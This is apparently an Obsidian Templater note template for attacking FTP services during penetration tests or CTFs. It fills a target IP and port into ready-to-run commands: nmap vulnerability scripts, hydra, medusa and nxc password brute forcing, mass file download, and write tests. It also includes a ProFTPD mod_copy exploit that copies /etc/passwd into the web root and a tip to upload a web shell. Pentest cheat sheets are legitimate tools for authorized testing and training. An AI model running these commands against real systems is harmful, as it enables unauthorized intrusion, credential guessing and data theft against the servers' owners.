<%-*
if (tp.frontmatter.current_port == undefined) {
  tp.frontmatter.current_port = await tp.system.prompt('Enter FTP port number: ')
}
-%>
# FTP — Port <% tp.frontmatter.current_port %>
<%*
let port = parseInt(tp.frontmatter.current_port)
let portFlag = port !== 21 ? `-P ${port}` : ""
let nmapPort = tp.frontmatter.current_port
let ip = tp.frontmatter.target_ip
-%>

---

## Nmap Scripts
```bash
nmap -sV -p<% nmapPort %> --script="ftp-*" <% ip %> -Pn
```

```bash
nmap -p<% nmapPort %> --script=ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221 <% ip %>
```

---

## Banner Grab
```bash
nc -nv <% ip %> <% nmapPort %>
```

```bash
telnet <% ip %> <% nmapPort %>
```

---

## Anonymous Login
```bash
ftp ftp://anonymous:anonymous@<% ip %> <% portFlag %>
```

```bash
curl -v ftp://<% ip %>:<% nmapPort %>/ --user anonymous:anonymous
```

> [!tip] Once connected, try: `ls -la`, `pwd`, `passive`, `binary`, `cd ..` (traverse up)

---

## Authenticated Login
```bash
ftp <% ip %> <% nmapPort %>
```

```bash
# With known creds
ftp ftp://<% tp.frontmatter.username || 'USER' %>:<% tp.frontmatter.password || 'PASS' %>@<% ip %> <% portFlag %>
```

---

## Brute Force
```bash
hydra -l <user> -P /usr/share/wordlists/rockyou.txt ftp://<% ip %> -s <% nmapPort %> -t 4
```

```bash
hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt ftp://<% ip %> -s <% nmapPort %>
```

```bash
medusa -h <% ip %> -u <user> -P /usr/share/wordlists/rockyou.txt -M ftp -n <% nmapPort %>
```

```bash
nxc ftp <% ip %> -u users.txt -p passwords.txt
```

---

## Download Everything
```bash
wget -m --no-passive --user=<user> --password=<pass> ftp://<% ip %>:<% nmapPort %> 2>&1
```

```bash
wget -m --no-passive ftp://anonymous:anonymous@<% ip %>:<% nmapPort %> 2>&1
```

```bash
# Recursive download with curl
curl -s ftp://<% ip %>:<% nmapPort %>/ --user anonymous:anonymous --list-only | while read f; do curl -s "ftp://<% ip %>:<% nmapPort %>/$f" -o "$f"; done
```

```bash
# Script — bulk download
ftp -n <<'EOF'
open <% ip %> <% nmapPort %>
quote USER anonymous
quote PASS anonymous
prompt no
binary
mget *
bye
EOF
```

---

## Upload / Write Test
```bash
# Test if upload is possible
ftp -n <<'EOF'
open <% ip %> <% nmapPort %>
quote USER <user>
quote PASS <pass>
put /tmp/test.txt test.txt
bye
EOF
```

> [!warning] If you can write, try uploading a web shell if a web server runs on the same root directory.

---

## FTP Bounce Scan
```bash
nmap -b <user>:<pass>@<% ip %>:<% nmapPort %> <target_network>
```

---

## Common Vulnerabilities

| Service | CVE | Notes |
|---------|-----|-------|
| vsftpd 2.3.4 | CVE-2011-2523 | Backdoor — smiley face `:)` in username |
| ProFTPD < 1.3.5 | CVE-2015-3306 | mod_copy unauthenticated file copy |
| FileZilla Server | — | Check for default admin port 14147 |
| Pure-FTPd | — | Misconfig can allow path traversal |

### vsftpd 2.3.4 Backdoor
```bash
nmap --script=ftp-vsftpd-backdoor -p<% nmapPort %> <% ip %>
```

### ProFTPD mod_copy (unauthenticated file copy)
```bash
nc <% ip %> <% nmapPort %>
SITE CPFR /etc/passwd
SITE CPTO /var/www/html/passwd.txt
```

---

## FTPS (Explicit / Implicit TLS)
```bash
# Explicit TLS (STARTTLS on standard port)
openssl s_client -connect <% ip %>:<% nmapPort %> -starttls ftp
```

```bash
# Implicit TLS (port 990)
openssl s_client -connect <% ip %>:990
```

```bash
lftp -e "set ssl:verify-certificate no; ls" ftp://<user>:<pass>@<% ip %>:<% nmapPort %>
```

---

## Notes
